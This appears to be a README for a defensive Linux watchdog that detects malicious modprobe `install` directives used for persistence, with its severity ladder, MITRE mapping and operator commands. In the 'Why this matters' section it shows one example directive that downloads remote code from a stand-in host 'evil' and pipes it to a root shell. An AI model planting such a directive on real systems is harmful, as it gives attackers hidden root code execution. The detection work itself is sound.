# modprobe-config-watchdog

Boot + daily delta of the admin/runtime modprobe config dirs
(`/etc/modprobe.d` + `/run/modprobe.d`) against a learned
baseline. Catches an `install` directive that runs a command on
module request. MITRE **T1547.006** (Kernel Modules and
Extensions) / **T1546** (Event Triggered Execution).

## Why this matters

A modprobe config line can be:

```
install evilmod /bin/sh -c 'curl -s http://evil | sh'
```

When **anything** requests `evilmod` — a manual `modprobe`,
kernel autoload on a matching device, a `systemd-modules-load`
entry, a coldplug event — modprobe runs the install command
**instead of** loading the module. That is code execution
(usually as root) triggered by a module request, and it is easy
to overlook: it lives in a config file, not a script or unit.
An attacker picks a module name that loads on a common device or
at boot and gets quiet persistence.

The **benign** idiom is `install <mod> /bin/true` (or
`/bin/false`) — the standard "disable this module" pattern, used
by selfdef's own `*-disable` modules (bluetooth, usb-storage,
rare-filesystems, …). This watchdog recognizes that idiom and
does NOT alert on it.

## Watched directories

| Directory | Watched | Why |
|---|---|---|
| `/etc/modprobe.d` | **yes** | admin config; the attacker-writable path |
| `/run/modprobe.d` | **yes** | volatile runtime config |
| `/usr/lib/modprobe.d` | **no** | package-managed; integrity-sentinel / aide-bridge cover package-owned content (mirrors the udev-rules decision) |

## Profiles

| Profile | Effect |
|---|---|
| `report` (default) | log delta; exit 0 |
| `enforce` | exit 1 on any modprobe-config change → systemd unit failed → notifier engine |

## Severity ladder

| Condition | Severity | Event |
|---|---|---|
| First scan | `ok` | `baseline_initial` |
| No delta | `ok` | `modprobe_config_intact` |
| A conf hash changed / a blacklist add or remove | `warn` | `modprobe_config_changed` |
| A new `install` directive whose command is benign (`/bin/true`/`/bin/false`) | `warn` | `modprobe_config_install_added` |
| A new `install` command that is exec-capable (anything else), or under /tmp /home /dev/shm, world-writable, or bare | `alert` | `modprobe_config_exec_install` (the payload signature) |

## What's recorded

- `file:<conf>:<sha12>` — hash of each `.conf` (catches any
  edit, including option/softdep changes).
- `install:<mod>:<cmd0>` — the first token of each `install`
  directive's command.
- `blacklist:<mod>` — each blacklist entry (benign; tracked so a
  blacklist REMOVAL — re-enabling a module an admin disabled —
  surfaces as a delta).

An install command that is anything other than `/bin/true` /
`/bin/false` is exec-capable and alert-grade; a target under
`/tmp`/`/home`/`/dev/shm`, a world-writable file, or a bare
relative command is the high-confidence payload signature.

## Cadence

`OnBootSec=13min` + `OnCalendar=*-*-* 07:10:00` — extends the
staggered ladder after shell-init (07:05). The boot catch
matters: an install directive fires on the next module autoload,
so confirming the set right after a restart is valuable.

## MITRE coverage

- **T1547.006** Boot or Logon Autostart Execution: Kernel
  Modules and Extensions — PRIMARY; the `install` directive
  weaponizes the module-load path.
- **T1546** Event Triggered Execution — module request is the
  trigger that runs the install command.
- **T1059.004** Command and Scripting Interpreter: Unix Shell —
  the install command is arbitrary shell execution.

## Operator workflow

```bash
# Last scan
journalctl -t selfdef-modprobe-config -n 1 --no-pager

# Per-change detail
journalctl -t selfdef-modprobe-config-detail --since "1 day ago"

# Manual inventory of install/blacklist directives
grep -rEn '^[[:space:]]*(install|blacklist)' /etc/modprobe.d /run/modprobe.d 2>/dev/null

# Investigate an exec_install alert
# - Is the install command anything other than /bin/true|false?
#   → it runs on module request. Inspect the command.
modprobe --show-depends <mod> 2>/dev/null   # see what modprobe would do
# Remove the rogue directive + payload, then re-baseline:
sudo sed -i '/install evilmod/d' /etc/modprobe.d/<file>.conf
sudo rm /var/lib/selfdef/modprobe-config-baseline.tsv
sudo systemctl start selfdef-modprobe-config.service

# Re-baseline after a legit `install <mod> /bin/true` you added
# (disabling a module): re-run the service once.
sudo rm /var/lib/selfdef/modprobe-config-baseline.tsv
sudo systemctl start selfdef-modprobe-config.service
```

## Caveats

- **A few legit packages use `install … /sbin/modprobe …`** for
  softdep-style chaining. Those are exec-capable and will fire
  `exec_install` (alert) — by design, so the operator vets every
  non-`/bin/true` install command; re-baseline once vetted. The
  writable/tmp/bare sub-signature is the high-confidence one.
- **Daily+boot cadence** misses an inject-trigger-revert within
  the window; an audit-rules watch on `/etc/modprobe.d` writes is
  the real-time complement.
- **`softdep` / `options` lines** are covered by the file hash
  (warn on change), not parsed individually — the `install` exec
  vector is the high-value target here.

## Coexistence

- **kernel-module-watchdog**: the matched sibling — that watches
  LOADED modules (`/proc/modules`); this watches the modprobe
  CONFIG that controls what happens when a module is requested.
  Together: what's loaded + what the load path will execute.
- **udev-rules / cron-job / systemd-unit / shell-init
  watchdogs**: the persistence-mechanism family — this adds the
  module-request (T1547.006) trigger surface.
- **The *-disable modules** (bluetooth-disable, usb-storage-mass-
  disable, rare-filesystems-disable, …): they WRITE the benign
  `install <mod> /bin/true` directives this module recognizes;
  this watchdog confirms those stay benign and flags any tamper.
- **aide-bridge / integrity-sentinel**: byte-level integrity on
  the conf files; this is the install-directive semantic view.
